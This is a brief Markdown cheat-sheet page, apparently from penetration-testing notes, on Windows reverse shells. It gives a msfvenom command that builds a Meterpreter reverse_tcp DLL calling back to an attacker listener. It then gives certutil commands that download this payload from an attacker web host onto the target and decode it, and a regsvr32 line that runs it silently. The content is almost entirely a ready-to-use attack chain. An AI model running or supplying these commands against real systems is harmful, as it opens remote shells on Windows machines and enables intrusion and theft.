---
title: Windows Reverse Shells
layout: default
nav_order: 5
parent: Reverse Shells

---

# Windows Reverse Shell
{: .no_toc }
## Table of Contents
{: .no_toc .text-delta }
1. TOC
{:toc}

### Meterpreter - DLL
```bash
msfvenom -p windows/meterpreter/reverse_tcp lhost=tun0 lport=8443 -f dll > dll.txt
```

Download `dll` from Windows target
```powershell
$IP=""
certutil -urlcache -split -f http://$IP/dll.txt dll.txt | certutil -encode dll.txt edll.txt
```

Decode and run `dll`: 
```powershell
certutil -decode .\edll.txt exploit.dll
regsvr32 /s /u .\exploit.dll
```

Reference - https://www.hackingarticles.in/windows-for-pentester-certutil/


